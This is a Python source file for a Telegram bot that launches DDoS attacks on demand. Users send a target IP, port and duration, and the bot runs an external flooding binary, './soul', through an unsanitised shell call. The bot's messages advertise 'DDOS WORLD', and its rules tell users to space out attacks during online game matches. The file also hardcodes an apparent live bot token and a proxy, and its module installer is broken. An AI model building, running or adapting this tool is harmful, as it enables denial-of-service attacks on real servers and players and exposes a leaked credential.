import subprocess
import sys
import logging

# Required dependencies
REQUIRED_MODULES = [
    "telebot==0.0.4",
    "asyncio",
    "ipaddress"
]

def install_missing_modules():
    """Ensure all required modules are installed."""
    for module in REQUIRED_MODULES:
        try:
            __import__(module)
        except ImportError:
            logging.warning(f"Module {module} not found. Installing...")
            subprocess.check_call([sys.executable, "python -m", "pip", "install", module])

# Install missing modules before running the bot
install_missing_modules()

import os
import telebot
import logging
import time
import random
import asyncio
from subprocess import Popen
from threading import Thread
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

TOKEN = '5299697243:AAHL3WvNyXjgrzuT7FE0-2YQO5-uTiXWWmM'  # Put your bot token here
 # This can also be removed if not used

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 10")
    await process.communicate()

# Initialize attack flag, duration, and start time
bot.attack_in_progress = False
bot.attack_duration = 0  # Store the duration of the ongoing attack
bot.attack_start_time = 0  # Store the start time of the ongoing attack

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        if bot.attack_in_progress:
            bot.send_message(chat_id, "*⚠️ Please wait!*\n"
                                       "*The bot is busy with another attack.*\n"
                                       "*Check remaining time with the /when command.*", parse_mode='Markdown')
            return

        bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"  
                                   "*Please provide the target IP, port, and duration in seconds.*\n"  
                                   "*Example: 167.67.25 6296 60* 🔥\n"  
                                   "*Let the chaos begin! 🎉*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)

    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❗ Error!*\n"  
                                               "*Please use the correct format and try again.*\n"  
                                               "*Make sure to provide all three inputs! 🔄*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*\n"  
                                               "*Please select a different port to proceed.*", parse_mode='Markdown')
            return
        if duration >= 600:
            bot.send_message(message.chat.id, "*⏳ Maximum duration is 599 seconds.*\n"  
                                               "*Please shorten the duration and try again!*", parse_mode='Markdown')
            return  

        bot.attack_in_progress = True  # Mark that an attack is in progress
        bot.attack_duration = duration  # Store the duration of the ongoing attack
        bot.attack_start_time = time.time()  # Record the start time

        # Start the attack
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*🚀 Attack Launched! 🚀*\n\n"  
                                           f"*📡 Target Host: {target_ip}*\n"  
                                           f"*👉 Target Port: {target_port}*\n"  
                                           f"*⏰ Duration: {duration} seconds! Let the chaos unfold! 🔥*", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    if bot.attack_in_progress:
        elapsed_time = time.time() - bot.attack_start_time  # Calculate elapsed time
        remaining_time = bot.attack_duration - elapsed_time  # Calculate remaining time

        if remaining_time > 0:
            bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining_time)} seconds...*\n"
                                       "*🔍 Hold tight, the action is still unfolding!*\n"
                                       "*💪 Stay tuned for updates!*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*🎉 The attack has successfully completed!*\n"
                                       "*🚀 You can now launch your own attack and showcase your skills!*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*❌ No attack is currently in progress!*\n"
                                   "*🔄 Feel free to initiate your attack whenever you're ready!*", parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = ("*🌟 Welcome to the Ultimate Command Center!*\n\n"
                 "*Here’s what you can do:* \n"
                 "1. *`/attack` - ⚔️ Launch a powerful attack and show your skills!*\n"
                 "2. *`/myinfo` - 👤 Check your account info and stay updated.*\n"
                 "3. *`/when` - ⏳ Curious about the bot's status? Find out now!*\n"
                 "4. *`/rules` - 📜 Review the rules to keep the game fair and fun.*\n\n"
                 "*💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!*")

    try:
        bot.send_message(message.chat.id, help_text, parse_mode='Markdown')
    except Exception as e:
        print(f"Error while processing /help command: {e}")

@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_text = (
        "*📜 Bot Rules - Keep It Cool!\n\n"
        "1. No spamming attacks! ⛔ \nRest for 5-6 matches between DDOS.\n\n"
        "2. Limit your kills! 🔫 \nStay under 30-40 kills to keep it fair.\n\n"
        "3. Play smart! 🎮 \nAvoid reports and stay low-key.\n\n"
        "4. No mods allowed! 🚫 \nUsing hacked files will get you banned.\n\n"
        "5. Be respectful! 🤝 \nKeep communication friendly and fun.\n\n"
        "6. Report issues! 🛡️ \nMessage TO Owner for any problems.\n\n"
        "💡 Follow the rules and let’s enjoy gaming together!*"
    )

    try:
        bot.send_message(message.chat.id, rules_text, parse_mode='Markdown')
    except Exception as e:
        print(f"Error while processing /rules command: {e}")


@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*🌍 WELCOME TO DDOS WORLD!* 🎉\n\n"
                                           "*🚀 Get ready to dive into the action!*\n\n"
                                           "*💣 To unleash your power, use the* `/attack` *command followed by your target's IP and port.* ⚔️\n\n"
                                           "*🔍 Example: After* `/attack`, *enter:* `ip port duration`.\n\n"
                                           "*🔥 Ensure your target is locked in before you strike!*\n\n"
                                           "*📚 New around here? Check out the* `/help` *command to discover all my capabilities.* 📜\n\n"
                                           "*⚠️ Remember, with great power comes great responsibility! Use it wisely... or let the chaos reign!* 😈💥", 
                                           parse_mode='Markdown')
    except Exception as e:
        print(f"Error while processing /start command: {e}")


if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
